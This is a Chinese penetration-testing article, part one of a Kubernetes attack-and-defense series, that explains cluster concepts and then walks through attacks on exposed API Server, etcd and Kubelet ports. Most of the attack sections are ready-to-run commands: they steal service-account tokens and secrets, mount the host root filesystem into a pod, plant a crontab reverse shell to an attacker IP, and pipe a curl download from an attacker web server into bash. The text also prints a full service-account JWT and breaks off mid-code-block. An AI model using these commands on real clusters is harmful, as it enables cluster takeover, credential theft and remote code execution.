

# K8s 集群安全攻防 (上) - 先知社区

K8s 集群安全攻防 (上)

- - -

## 文章前言

在打攻防演练的时候偶尔会遇到目标内网资产采用集群化部署的情况 (GuoQi 偏多)，在这种情况下由于刷分需求就需要对集群进行攻击测试以争取控制整个集群，本篇文章将从 K8s 的基本概念、主要组件、架构和安全评估测试方法等维度对 K8s 的安全进行系统性介绍

## 基础知识

### 容器概念

Container(容器) 是一种便携式、轻量级的操作系统级虚拟化技术，它使用 namespace 隔离不同的软件运行环境，并通过镜像自包含软件的运行环境，从而使得容器可以很方便的在任何地方运行，由于容器体积小且启动快，因此可以在每个容器镜像中打包一个应用程序，这种一对一的应用镜像关系拥有很多好处，使用容器不需要与外部的基础架构环境绑定，因为每一个应用程序都不需要外部依赖，更不需要与外部的基础架构环境依赖，完美解决了从开发到生产环境的一致性问题

### Pod 概念

Kubernetes 使用 Pod 来管理容器，每个 Pod 可以包含一个或多个紧密关联的容器，Pod 是一组紧密关联的容器集合，它们共享 PID、IPC、Network 和 UTS Namespace，是 Kubernetes 调度的基本单位，Pod 内的多个容器共享网络和文件系统，可以通过进程间通信和文件共享这种简单高效的方式组合完成服务  
[![](assets/1701826061-3ac5d403949c0d7283cacc0d7563903f.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231025162739-5c21726a-7310-1.png)  
在 Kubernetes 中对象使用 ManiFest(YAML 或 JSON) 来定义，一个简单的 Nginx 服务可以定义为 nginx.yaml，它包含一个镜像为 nginx 的容器，示例如下：

```bash
apiVersion: v1
kind: Pod
metadata:
    name: nginx
    labels:
        app: nginx
spec:
    containers:
    -name: nginx
         image: nginx
         ports:
        -containerPort: 80
```

### Node 概念

Node 是 Pod 真正运行的主机，可以是物理机，也可以是虚拟机，为了管理 Pod 每个 Node 节点上至少要运行 Container Runtime(比如 docker 或者 rkt)、Kubelet 和 Kube-proxy 服务

[![](assets/1701826061-87a502caa4a4b70be3406312b3942545.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231025162909-91a42342-7310-1.png)

### Namespace

Namespace 是对一组资源和对象的抽象集合，比如可以用来将系统内部的对象划分为不同的项目组或用户组，常见的 pods, services, replication controllers 和 deployments 等都是属于某一个 namespace 的 (默认是 default)，而 node, persistentVolumes 等则不属于任何 namespace

### Service 概念

Service 是应用服务的抽象，通过 labels 为应用提供负载均衡和服务发现，匹配 labels 的 Pod IP 和端口列表组成 endpoints，由 kube-proxy 负责将服务 IP 负载均衡到这些 endpoints 上，通常每一个 Service 都会自动分配一个 Cluster IP(仅在集群内部可访问的虚拟地址) 和 DNS 名，其他容器可以通过该地址或 DNS 来访问服务，而不需要了解后端容器的运行：

[![](assets/1701826061-dd58d21d0be51044b0388c6a40e86356.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231025162931-9e974db8-7310-1.png)

```bash
apiVersion: v1
kind: Service
metadata:
    name: nginx
spec:
    ports:
        - port: 8078 # the port that this service should serve on
        name: http
        # the container on each pod to connect to, can be a name
        # (e.g. 'www') or a number (e.g. 80)
        targetPort: 80
        protocol: TCP
    selector:
        app: nginx
```

## 架构概览

### 架构源起

Borg 是谷歌内部的大规模集群管理系统，负责对谷歌内部很多核心服务的调度和管理，Borg 的目的是让用户能够不必操心资源管理的问题，让他们专注于自己的核心业务，并且做到跨多个数据中心的资源利用率最大化  
Borg 主要由 BorgMaster、Borglet、Borgcfg 和 Scheduler 组成，架构示意图如下：

[![](assets/1701826061-3ce481ccf825f7c6b6d2375b018ccc18.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231025163101-d46c61a8-7310-1.png)

-   Borglet：负责真正运行任务 (在容器中)
-   Borgcfg：Borg 的命令行工具，用于跟 Borg 系统交互，一般通过一个配置文件来提交任务
-   Scheduer：负责任务的调度，根据应用的特点将其调度到具体的机器上去
-   BorgMaster：是整个集群的大脑，负责维护整个集群的状态，并将数据持久化到 Paxos 存储中

### 架构模型

K8s 借鉴了 Borg 的设计理念，比如:Pod、Service、Label、单 Pod、单 IP 等，Kubernetes 的整体架构跟 Borg 非常像，如下图所示：

[![](assets/1701826061-8207a21f75cda2915a12c0f50f9a9e27.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231025163144-ee2fbfe0-7310-1.png)

K8s 主要由以下几个核心组件组成：

-   etcd：保存了整个集群的状态
-   apiserver：提供了资源操作的唯一入口，并提供认证、授权、访问控制、API 注册和发现等机制
-   controller manager：负责维护集群的状态，比如：故障检测、自动扩展、滚动更新等
-   scheduler：负责资源的调度，按照预定的调度策略将 Pod 调度到相应的机器上
-   kubelet：负责维护容器的生命周期，同时也负责 Volume(CSI) 和网络 (CNI) 的管理
-   Container runtime：负责镜像管理以及 Pod 和容器的真正运行 (CRI)
-   kube-proxy：负责为 Service 提供 cluster 内部的服务发现和负载均衡

## 核心组件

Kubernetes 主要由以下几个核心组件组成，这也是我们对 K8s 进行安全评估的主要测试维度：

-   etcd：保存了整个集群的状态
-   apiserver：提供了资源操作的唯一入口，并提供认证、授权、访问控制、API 注册和发现等机制
-   controller manager：负责维护集群的状态，比如故障检测、自动扩展、滚动更新等
-   scheduler：负责资源的调度，按照预定的调度策略将 Pod 调度到相应的机器上
-   kubelet：负责维护容器的生命周期，同时也负责 Volume(CVI) 和网络 (CNI) 的管理
-   Container runtime：负责镜像管理以及 Pod 和容器的真正运行 (CRI）
-   kube-proxy：负责为 Service 提供 cluster 内部的服务发现和负载均衡

[![](assets/1701826061-07873522757fa571f401c2577de31bd8.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231025163329-2c97ad2e-7311-1.png)

下面是关键组件的一些常用默认端口：

[![](assets/1701826061-d93a2682ad9125b07304c13007da560d.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231025163420-4b0753b8-7311-1.png)

## 渗透路径

常见的 K8S 的渗透路径：  
[![](assets/1701826061-09e3e5289c0dea8eab0b80a07fd73ca1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231025172754-c6c5b272-7318-1.png)  
形象的 K8S 的渗透过程：

[![](assets/1701826061-0fcc7a52360ced12feb85e2aae503e53.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231025172820-d62cb01c-7318-1.png)

## 信息收集

我们评估是如果获取到应用的 webshell 权限时是很有必要判断一下当前的环境的，最狠的一次是之前打 HW 的时候有厂商搭建了一套完整的域环境的蜜罐系统，看着你打.....，所以这个阶段要做的还是信息收集

### 环境信息

```bash
env
```

[![](assets/1701826061-169584e305b2c2b4954d736bba064a04.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231025164142-52441a70-7312-1.png)

```bash
env | grep KUBERNETES
```

[![](assets/1701826061-c6d70d21fe6c27d23aae1a5b3850cc83.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231025164159-5c9be49e-7312-1.png)

### 容器检测

注意下面的.dockerenv 哦：

```bash
ls -al
```

[![](assets/1701826061-07b664c84356bb2a47883696b078923d.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231025164242-766814ba-7312-1.png)

### 内核版本

需要下载 kubectl 到 pod 中，之后通过执行以下命令来获取 node 节点的内核版本信息

```bash
kubectl get nodes -o jsonpath='{range .items[*]}{.metadata.name}{"\t"}{.status.nodeInfo.kernelVersion}{"\n"}{end}'
```

[![](assets/1701826061-980ff08271d4ffa730f0759956b6d3a2.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231025164332-94087140-7312-1.png)

### Token 类

K8s 集群创建的 Pod 中容器内部默认携带 K8s Service Account 认证凭据 (/run/secrets/kubernetes.io/serviceaccount/token)，利用该凭据可以认证 K8s API-Server 服务器并访问高权限接口，如果执行成功意味着该账号拥有高权限，可以直接利用 Service Account 管理 K8s 集群

```bash
cat /var/run/secrets/kuberenetes.io/serviceaccount/token
```

[![](assets/1701826061-8903adb02acbd34f6f619fe264c1f7b8.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231025164358-a3c744da-7312-1.png)

### Secret 类

K8s Secrets 用于存储敏感数据，从 Secrets 中获取的 AK 及通信凭证可用户后续渗透中从外部或云产品 API 窃取信息：

```bash
#命令格式
./cdk run k8s-secret-dump (auto|<service-account-token-path>)

#使用实例
./cdk run k8s-secret-dump auto
```

[![](assets/1701826061-1799cda5d905935dd35dd84708c81f00.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231025164428-b51a18e8-7312-1.png)

### 安全策略

对于已经获取了 kubeconfig 或 sa 账号权限，进而想要创建特殊配置的容器，但是受到了 K8s Pod Security Policies 的限制时可以使用这个 Exploit 获取 Pod Security Policies 的规则信息

```bash
#命令格式
./cdk run k8s-psp-dump (auto|<service-account-token-path>

#使用实例
./cdk run k8s-psp-dump auto
2021/03/24 22:15:58 getting K8s api-server API addr.
    Find K8s api-server in ENV: https://ip:8443
2021/03/24 22:15:58 trying to dump K8s Pod Security Policies with local service-account: token
2021/03/24 22:15:58 requesting  /apis/policy/v1beta1/podsecuritypolicies
2021/03/24 22:15:58 dump Pod Security Policies success, saved in:  k8s_pod_security_policies.json
2021/03/24 22:15:58 requesting  /api/v1/namespaces/default/pods
2021/03/24 22:15:58 K8S Pod Security Policies rule list:
2021/03/24 22:15:58 rule { securityContext.hostPID: true } is not allowed.
2021/03/24 22:15:58 rule { securityContext.hostIPC: true } is not allowed.
2021/03/24 22:15:58 rule { volumes[0].hostPath.pathPrefix: \"/proc\" } is not allowed.
2021/03/24 22:15:58 rule { volumes[1].hostPath.pathPrefix: \"/dev\" } is not allowed.
2021/03/24 22:15:58 rule { volumes[2].hostPath.pathPrefix: \"/sys\" } is not allowed.
2021/03/24 22:15:58 rule { volumes[3].hostPath.pathPrefix: \"/\" } is not allowed.
2021/03/24 22:15:58 rule { containers[0].securityContext.capabilities.add: \"SYS_ADMIN\" } is not allowed.
2021/03/24 22:15:58 rule { containers[0].securityContext.capabilities.add: \"SYS_PTRACE\" } is not allowed.
```

### 端口服务

[![](assets/1701826061-84e91d2f370c67894acd998c45e870c2.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231025164516-d217ee98-7312-1.png)

### 内部网络

-   Flannel 默认使用 10.244.0.0/16 网络
-   Calico 默认使用 192.168.0.0/16 网络

## 常规利用

这一部分注意介绍一些常见的因为 K8s 自身的漏洞或者安全配置不当导致的可被利用的漏洞点：

### 未授权类

#### K8s API Server 未授权

**基本介绍**  
k8s 的 Master 节点上会暴露 kube-apiserver，默认情况下会开启以下两个 HTTP 端口：  
A：Localhost Port

-   HTTP 服务
-   主机访问受保护
-   在 HTTP 中没有认证和授权检查
-   默认端口 8080，修改标识–insecure-port
-   默认 IP 是本地主机，修改标识—insecure-bind-address

B: Secure Port

-   使用基于策略的授权方式
-   认证方式，令牌文件或者客户端证书
-   默认端口 6443，修改标识—secure-port
-   默认 IP 是首个非本地主机的网络接口，修改标识—bind-address
-   HTTPS 服务。设置证书和秘钥的标识，–tls-cert-file，–tls-private-key-file

以上两个端口主要存在以下两类安全风险：

-   开发者使用 8080 端口并将其暴露在公网上，攻击者就可以通过该端口的 API 直接对集群下发指令
-   运维人员将"system:anonymous"用户绑定到"cluster-admin"用户组，使匿名用户可以通过 6443 端口以管理员权限向集群内部下发指令

**漏洞检测**  
在浏览器中访问以下 URL：

```bash
#格式说明
http://ip:port/

#使用实例
http://192.168.17.144:8080/
```

[![](assets/1701826061-42ae9657b274774cdc38b6854f5a56c8.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231025164840-4b6c2c96-7313-1.png)  
返回以上信息说明存在 K8s API Server 未授权访问漏洞~  
**漏洞利用**  
利用方式按严重程度可分为以下两种攻击类型：

-   通过利用 kubectl 客户端调用 Secure Port 接口去控制已经创建好的容器
-   通过创建一个自定义的容器将系统根目录的文件挂在到/mnt 目录，之后通过修改/mnt/etc/crontab 来影响宿主机的 crontab，通过反弹 Shell 拿到宿主机的权限

**容器管理**

Step 1：获取目标机器的信息

```bash
#格式说明
kubectl -s ip:port get nodes

#执行实例
kubectl -s 192.168.17.144:8080 get nodes
```

[![](assets/1701826061-f12a9f312a47980eda6fdf5358d91a66.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231025164911-5e4daf24-7313-1.png)

备注说明：如果出现"Error from server (NotFound): the server could not find the requested resource"报错，可能是因为 Kubectl 客户端和 K8s 的 Server 端版本不相同导致的需要进行降级操作，此时需要将版本降低到和目标主机版本一致即可

```bash
curl -LO https://storage.googleapis.com/kubernetes-release/release/v1.8.7/bin/linux/amd64/kubectl
chmod 777 kubectl
mv /usr/bin/kubectl /usr/bin/kubectl.bak
mv kubectl /usr/bin/kubectl
```

Step 2：获取命名空间

```bash
kubectl -s 192.168.17.144:8080 get namespace
```

[![](assets/1701826061-efe0a52fd4ce5b599010baa1a9e67c20.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231025164941-700479a0-7313-1.png)  
Step 3：获取某一命名空间下的 Pod 列表

```bash
kubectl -s 192.168.17.144:8080 get pod -n default
```

Step 4：执行以下命令接管 pod，可以看到下方返回的提示是"pod nginx does not have a host assigned"，这是由于 pod 未指定 host 所致

```bash
#格式说明
kubectl -s ip:port  --namespace=default exec -it dockername bash

#执行实例
kubectl -s 192.168.17.144:8080 -n default exec -it nginx /bin/sh
```

[![](assets/1701826061-ffc1d74b04657c18e25a249b1ce4b899.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231025165014-8363d04a-7313-1.png)  
nginx 的 yaml 文件如下：

```bash
apiVersion: v1                      
kind: Pod                           
metadata:
  name: nginx                       
spec:                               
  containers:
  - image: nginx:alpine             
    name: container-0               
    resources:                      
      limits:
        cpu: 100m
        memory: 200Mi
      requests:
        cpu: 100m
        memory: 200Mi
  imagePullSecrets:                 
  - name: default-secret
```

如果幸运的化我们可以找到恰当的 Pod 并通过信息收集以及逃逸获取宿主机的权限，之后控制节点以及整个集群~  
**反弹 shell**  
A、Web Dashboard  
Step 1：查看当前 Namespace 确定命名空间有哪些

```bash
kubectl -s 192.168.17.144:8080 get namespaces
```

[![](assets/1701826061-6abb173096a14e24aff97e2f1daa124c.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231025165051-99e97914-7313-1.png)  
Step 2：查看"kubernetes-dashboard"命名空间下 pod 与 service 的详细状态

```bash
kubectl -s 192.168.17.144:8080 get pods,svc -n kubernetes-dashboard -o wide
```

[![](assets/1701826061-f473b24a88faf2d8608c39c0ef78ea9d.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231025165115-a80df8e4-7313-1.png)  
Step 3：查看 Serviceaccount 和 Secrets

```bash
kubectl -s 192.168.17.144:8080 get sa,secrets -n kubernetes-dashboard
```

[![](assets/1701826061-954de94ec19d4b0eb1240c173a04e893.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231025165139-b6542ef0-7313-1.png)  
Step 4：查看 token，在这里我们要根据上一步的输出进行多项 service-account-token 的查看，因为部分会应权限而导致操作有限

```bash
kubectl -s 192.168.17.144:8080 describe secrets admin-myuser-token-jcj9d -n kubernetes-dashboard
```

[![](assets/1701826061-a4b294775e03a2186290af93800176b6.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231025165202-c414e214-7313-1.png)  
Step 5：尝试登录 DashBoard

[![](assets/1701826061-e1a60ea4b5285a67b16a70e367e0f267.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231025165216-cc6b07a4-7313-1.png)  
Step 6：创建一个 pod，并将本地根目录挂载到 pod 的/mnt 目录中

```bash
apiVersion: v1
kind: Pod
metadata:
  name: myapp
spec:
  containers:
  - image: nginx
    name: container
    volumeMounts:
    - mountPath: /mnt
      name: test-volume
  volumes:
  - name: test-volume
    hostPath:
      path: /
```

[![](assets/1701826061-9902c5c37e39af4961fef798b52c1a80.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231025165237-d8e5c654-7313-1.png)

[![](assets/1701826061-79e76a19b66bee3e6fcbabfc0ad6c751.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231025165250-e05941c2-7313-1.png)

Step 7：之后可以看到创建的 myapp Pod

[![](assets/1701826061-8f6137ddc6ebdfacad483751ee9a00a2.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231025165301-e7572444-7313-1.png)  
Step 8：之后进入挂载的/mnt 目录中，就是 master 节点的对应目录了

[![](assets/1701826061-20776aaed0adfa4927ee0d164a1bd924.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231025165313-ee8ed612-7313-1.png)  
[![](assets/1701826061-2454090321fa56c47f73f62097fcdb94.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231025165322-f3affc8e-7313-1.png)

Step 9：之后写计划任务

```bash
echo -e "* * * * * root bash -i >& /dev/tcp/192.168.17.158/4444 0>&1\n" >> /mnt/etc/crontab
```

[![](assets/1701826061-c8f1250161fccedafd03ea884759528a.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231025165345-0128d052-7314-1.png)

Step 10：成功反弹 shell

[![](assets/1701826061-9275c3f606fb0d2be62dce825de25682.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231025165358-08e2a4c6-7314-1.png)

B, Kubectl Client

Step 1：新建 myapp2.yaml 文件

```bash
apiVersion: v1
kind: Pod
metadata:
  name: myapp2
spec:
  containers:
  - image: nginx
    name: container0
    volumeMounts:
    - mountPath: /mnt
      name: test-volume
  volumes:
  - name: test-volume
    hostPath:
      path: /
```

Step 2：创建容器

```bash
kubectl -s 192.168.17.144:8080 create -f myapp2.yaml
```

[![](assets/1701826061-228eb663730a15f42aa13590fb9780a3.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231025165434-1e742a26-7314-1.png)  
Step 3：查看容器状态

```bash
kubectl -s 192.168.17.144:8080 get pod -n default
```

[![](assets/1701826061-ecac7a3e21e1d2ce3ba786eeba668d1d.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231025165454-2a475030-7314-1.png)  
Step 4：进入容器 (由于上面迟迟处于 pending 状态，也许时内存问题，这里不再过多赘述，直接向下写流程)

```bash
kubectl -s 192.168.17.144:8080 --namespace=default exec -it myapp2 bash
```

```bash
Step 5：写计划任务
```

```bash
echo -e "* * * * * root bash -i >& /dev/tcp/x.x.x.x/8888 0>&1\n" >> /mnt/etc/crontab
```

Step 6：成功获取 shell

[![](assets/1701826061-9da6ccad4958d19e01b238a8d5294d07.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231025165531-40489a4c-7314-1.png)

**接口扩展**  
补充一些可用接口：

[![](assets/1701826061-4343cca5314a03fa82533194cbae241e.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231025165610-578bd958-7314-1.png)

### ETCD 端口未授权访问

**漏洞概述**  
ETCD 最大的安全风险是未授权访问，在启动 etcd 时如果没有指定--client-cert-auth 参数打开证书校验，并且没有通过 iptables/防火墙等实施访问控制，ETCD 的接口和数据就会直接暴露给外部黑客

**漏洞检测**  
ETCD 一般监听 2379 端口且对外暴露 Client API，可以指定是否启用 TLS，因此这个端口可能是 HTTP 服务，也可能是 HTTPS 服务，扫描器可以通过检查以下 2 个接口来判断是否存在未授权访问漏洞：  
第一个接口：[https://IP:2379/version](https://ip:2379/version)

[![](assets/1701826061-98a67c85aa719c0430d57cfe74c4a556.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231025165717-7fe2ab66-7314-1.png)

第二个接口： [https://IP:2379/v2/keys](https://ip:2379/v2/keys)

[![](assets/1701826061-7a4052a70fc262dfa85a837ca5e9764a.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231025165750-937659ac-7314-1.png)

**攻击测试**  
ETCD V2 和 V3 是两套不兼容的 API，K8s 使用 V3，通过环境变量设置 API V3：

```bash
export ETCDCTL_API=3
```

检查是否正常连接

```bash
etcdctl endpoint health

127.0.0.1:2379 is healthy: successfully committed proposal: took = 939.097µs
```

查看 K8s secrets

```bash
etcdctl get / --prefix --keys-only | grep /secrets/
```

获取集群中保存的云产品 AK，横向移动：

```bash
etcdctl get /registry/secrets/default/acr-credential-518dfd1883737c2a6bde99ed6fee583c
```

读取 service account token

```bash
etcdctl get / --prefix --keys-only | grep /secrets/kube-system/clusterrole
```

通过 token 认证访问 API-Server，接管集群：

```bash
kubectl --insecure-skip-tls-verify -s https://127.0.0.1:6443/ --token="[ey...]" -n kube-system get pods
```

**证书使用**  
查看链接状态

```bash
sudo ./etcdctl --key=/etc/kubernetes/pki/etcd/server.key --cert=/etc/kubernetes/pki/etcd/server.crt --cacert=/etc/kubernetes/pki/etcd/ca.crt --endpoints https://127.0.0.1:2379 endpoint health
```

[![](assets/1701826061-4c7f71b41ccc96844d965659495a1d3a.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231025170439-877d434e-7315-1.png)  
查看集群状态

```bash
etcdctl --write-out=table --key=/etc/kubernetes/pki/etcd/server.key --cert=/etc/kubernetes/pki/etcd/server.crt --cacert=/etc/kubernetes/pki/etcd/ca.crt --endpoints https://127.0.0.1:2379 endpoint status
```

[![](assets/1701826061-cb358c9a1777c706bf92719849421796.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231025170458-92612000-7315-1.png)  
列出所有的 keys

```bash
./etcdctl --key=/etc/kubernetes/pki/etcd/server.key --cert=/etc/kubernetes/pki/etcd/server.crt --cacert=/etc/kubernetes/pki/etcd/ca.crt --endpoints https://127.0.0.1:2379 get / --prefix --keys-only
```

查看 K8s Secret

```bash
./etcdctl --key=/etc/kubernetes/pki/etcd/server.key --cert=/etc/kubernetes/pki/etcd/server.crt --cacert=/etc/kubernetes/pki/etcd/ca.crt --endpoints https://127.0.0.1:2379/ get / --prefix --keys-only | grep /secrets/
```

[![](assets/1701826061-e27f949c8b7dfb2f2c88f174f38d5751.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231025170530-a5902216-7315-1.png)  
读取服务 Token

```bash
./etcdctl --key=/etc/kubernetes/pki/etcd/server.key --cert=/etc/kubernetes/pki/etcd/server.crt --cacert=/etc/kubernetes/pki/etcd/ca.crt --endpoints https://127.0.0.1:2379/ get /registry/secrets/kubernetes-dashboard/admin-myuser-token-jcj9d
```

[![](assets/1701826061-38c85a02fc0d13fac67c16f8963d49fd.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231025170551-b215a506-7315-1.png)  
Token 接管集群

```bash
kubectl --insecure-skip-tls-verify -s https://127.0.0.1:6443/ --token="[ey...]" -n kube-system get pods
```

[![](assets/1701826061-4674f6b8c82eda97c26081c90d86df92.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231025170639-cee03494-7315-1.png)

### Kubelet 端口未授权类

**基本介绍**  
K8s Node 对外开启 10250(Kubelet API) 和 10255 端口 (readonly API)，默认情况下 kubelet 监听的 10250 端口没有进行任何认证鉴权，攻击者可以通过利用该设计缺陷来创建恶意 pod 或控制已有 pod，后续可尝试逃逸至宿主机  
**利用过程**  
Step 1：获得 token  
首先需要确定 node 是否存在未授权问题，如果访问以下地址并返回如下数据表示可以利用

```bash
https://ip:10250/pods
```

[![](assets/1701826061-a68d0969d5daeacaddff65a3504af9c5.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231025170821-0b8e1a96-7316-1.png)  
Step 2：基础信息确定  
从上述结果中确定 namespace、pod\_name、container\_name，关于查找方法可以通过检索 selfLink，此时会发现再返回的数据中会有一个类似"/api/v1/namespaces/kube-system/pods/kube-flannel-ds-xwk2t"的值，其中 namespaces 就是后面的 kube-system，pods 就是后面的 kube-flannel-ds-xwk2t，如果执行失败可以看看 phase 的状态是不是 fail，如果是的话就换一个 phase 是 running 的试试

[![](assets/1701826061-0dfc40669e7b456ec827c5f74a0f2786.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231025170837-14c657a4-7316-1.png)

[![](assets/1701826061-8821cfdbddac18897e82eae8450a0257.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231025170847-1b1e44d6-7316-1.png)  
Step 3：执行命令  
可以通过一下命令再在对应的容器里执行命令：

```bash
#格式说明
curl -k -XPOST "https://k8s-node-1:10250/run/%namespace%/%pod_name%/%container_name%" -d "cmd=ls -la /"

#执行实例
curl -k -XPOST "https://192.168.17.144:10250/run/kube-system/kube-flannel-ds-xwk2t/kube-flannel" -d "cmd=ls -la /"
```

[![](assets/1701826061-799b7ab4a0bc9c25778f1d366a82c891.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231025170909-285474fe-7316-1.png)  
Step 4：检索 Token 信息  
默认情况下 Token 保存在/var/run/secrets/kubernetes.io/serviceaccount/token

```bash
curl -k -XPOST "https://192.168.17.144:10250/run/kube-system/kube-flannel-ds-xwk2t/kube-flannel" -d "cmd=cat /var/run/secrets/kubernetes.io/serviceaccount/token"
```

[![](assets/1701826061-9beb164180755f7c1f7468c5bc81c202.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231025170949-3ff2c61a-7316-1.png)  
如果 token 不在/var/run/secrets/kubernetes.io/serviceaccount/token，那么可以通过 mount 命令来查找

```bash
curl -k -XPOST "https://192.168.17.144:10250/run/kube-system/kube-flannel-ds-xwk2t/kube-flannel" -d "cmd=mount"
```

[![](assets/1701826061-9766614fbddbae6845eb5e971261884d.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231025171017-50ebfe0a-7316-1.png)  
Step 5：获得 master 访问权  
接下来可以尝试获得 master(api server) 的访问权限，默认情况下 api server 开放的端口为 6443，所以可以通过扫描同个网段开放 6443 的主机来挨个尝试，除了这种方法还可以尝试执行 env 命令来查看是否有 api server 的地址或者其他敏感信息：

```bash
curl -k -XPOST "https://192.168.17.144:10250/run/kube-system/kube-flannel-ds-xwk2t/kube-flannel" -d "cmd=env"
```

[![](assets/1701826061-d8e30f93227496ba79d1c112dea9d572.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231025171053-660b416a-7316-1.png)

```bash
curl -k -XPOST "https://192.168.17.144:10250/run/kube-system/kube-flannel-ds-xwk2t/kube-flannel" -d "cmd=netstat -ntlp"
```

[![](assets/1701826061-b950bcf34fc57e7f48431dd00b423cb5.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231025171112-71be1410-7316-1.png)  
如果提示 Error from server (Forbidden): secrets is forbidden: User“" cannot list resource "secrets" in API 则说明权限不够

```bash
kubectl --insecure-skip-tls-verify=true --server="https://192.168.17.144:6443" --token="eyJhbGciOiJSUzI1NiIsImtpZCI6Iml3OVRtaVlnREpPQ0h2ZlUwSDBleFlIc29qcXgtTmtaUFN4WDk4NjZkV1EifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJrdWJlLXN5c3RlbSIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJmbGFubmVsLXRva2VuLWhwbGJ0Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQubmFtZSI6ImZsYW5uZWwiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC51aWQiOiIwMmJmZmUzZi0wNGE5LTQ2MTItYjRjYy1mYjNkNTdiNjZiZDkiLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6a3ViZS1zeXN0ZW06Zmxhbm5lbCJ9.oGnRE55P1Dv9W4-Gs8UCp5M1_vdL2flZ0WYJtr8HTMgb2Si6wb-N_ltS1HRi_Q9VHsS_CsjHw3ZqA-jQvbz-RENNLDEL20nUt9J51IyqeGPC3sKAd3fVOZmViIVrYsQSewvPHwPq7qvFnIj1aR-pFYrB47iohej2XvS4aTNZMdpxhL0jCBa3o5SFZg1oNR1rzJd1hhSaCNAbQ7_JMdTuCy4aU0zykVd0GoUF9gXRD7Avx9Y25QGCBTdPgL11fzjcGiG93KtfE4QASiLemnxDF1TPeob9MERFbT6mq-CQ7243U6HjF6Lx-1NfLk52qaXp3hbpGySNudUz_i_Q-KWIgw" get secrets --all-namespaces -o jsonv
```

[![](assets/1701826061-4906b693618f5db8858d0efae120440f.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231025171137-806ab950-7316-1.png)  
Step 6：获取 node 里 pod 的 shell  
攻击者可以本地搭建 web 服务，通过在 node 中的 pod 里执行反弹语句来获得 node 的 shell，假定这里的 192.168.17.161:80 是攻击者 web 服务，之后写入以下反弹 shell 指令，之后启动一个简易的 HTTP 服务：

[![](assets/1701826061-f5db2883d1ee300a9158018f6d7eeed2.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231025171203-8f8ed894-7316-1.png)  
在本地浏览器中进行简单测试：

[![](assets/1701826061-17ac8f68ba5a6552b08a2c1fea409da1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231025171216-976efa26-7316-1.png)  
之后在攻击主机上监听：  
[![](assets/1701826061-aaf067896e9f9f0c2b4d4df4db743583.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231025171228-9e83b734-7316-1.png)  
之后进行反弹 shell 操作：

```bash
curl --insecure -v -H "X-Stream-Protocol-Version: v2.channel.k8s.io" -H "X-Stream-Protocol-Version: channel.k8s.io" -X POST "https://192.168.17.144:10250/exec/kube-system/kube-flannel-ds-xwk2t/kube-flannel?command=/bin/bash&command=-c&command=curl+192.168.17.161:80+|+bash&input=1&output=1&tty=1"
```

[![](assets/1701826061-75e897bb65a3460b621695ca74a10e3a.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231025171249-ab27145e-7316-1.png)  
发现并不行，之后尝试下面的语句 (主要换了 sh)

```bash
